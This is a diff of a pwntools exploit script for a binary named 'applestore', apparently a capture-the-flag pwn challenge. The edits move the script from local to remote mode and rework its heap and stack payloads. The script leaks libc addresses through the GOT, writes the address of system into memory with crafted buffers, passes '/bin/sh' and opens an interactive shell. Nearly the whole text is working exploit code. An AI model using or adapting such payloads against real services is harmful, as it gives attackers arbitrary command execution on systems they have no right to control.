@@ -2,7 +2,7 @@ from pwn import *
 import time, sys
 
 # local process envirnoment
-LOCAL = True
+LOCAL = False
 elf_name = "./applestore"
 
 #retmote args
@@ -17,15 +17,16 @@ if LOCAL:
     malloc_off = 0x70D80
     system_off = 0x3ADA0
     execsh_off = 0x3AC8D
+    puts_off = 0x5FCA0
 
     mine_env = os.environ
-    mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
+    #mine_env['LD_PRELOAD'] = "/home/deadfish/Pwn/Tools/preeny/x86-linux-gnu/dealarm.so"
     io = process(elf_name, env=mine_env)
     '''
     io = process(elf_name)
     '''
 else:
-    context.log_level = "debug"
+    #context.log_level = "debug"
     malloc_off = 0x766B0
     system_off = 0x40190
     execsh_off = 0x40063
@@ -81,10 +82,10 @@ def s_exp():
     main_addr = 0x8048CA6
     heap_off = 0x3E0
     for i in range(19):
-        add(1)
+        add(1)  # 199
     for i in range(6):
         add(3)  # 499
-    add(4)
+    add(4)  #399
     checkout("y")
     payload = 'y'+'\x00'+p32(elf.got['malloc'])+p32(0)+p32(0)
     cart(payload)
@@ -109,22 +110,23 @@ def s_exp():
     log.info("stack address:"+hex(stack_addr))
     # exploit
     atoi_bss = elf.got['atoi']
-    # payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x22+0x18) + p32(stack_addr+0x20-0x08)
-    payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x20+0x18+0x40) + p32(stack_addr+0x20-0x08)
+    payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x22+0x20) + p32(stack_addr+0x20-0x08)
+    # payload = str(27) + '\x00'*4 + p32(system_addr) + p32(stack_addr+0x04+0x20+0x18+0x40) + p32(stack_addr+0x20-0x08)
     payload = payload.ljust(0x15, chr(0))
     fake_del(payload)
 
     # FFFD6EC8
     # FFBBA254 FFBBA294
     pause()
-    '''
-    cmds = "sh".ljust(4, chr(0)) + p32(stack_addr+0x44+0x1C)
-    payload = cmds + p32(system_addr) + p32(stack_addr+0x44) + p32(stack_addr+0x1C)
+
+    cmds = "/bin/sh\x00"
+    payload = p32(system_addr) + p32(stack_addr+0x30) + p32(stack_addr+0x30) + cmds
     payload = payload.ljust(0x15, chr(0))
     '''
     cmds = "sh".ljust(4, chr(0)) + p32(stack_addr+0x44+0x1C)
     payload = '6\x00' + cmds + p32(system_addr) + p32(stack_addr+0x44) + p32(stack_addr+0x1C)
     #payload = payload.ljust(0x15, chr(0))
+    '''
     fake_leave(payload)
     io.interactive()
 
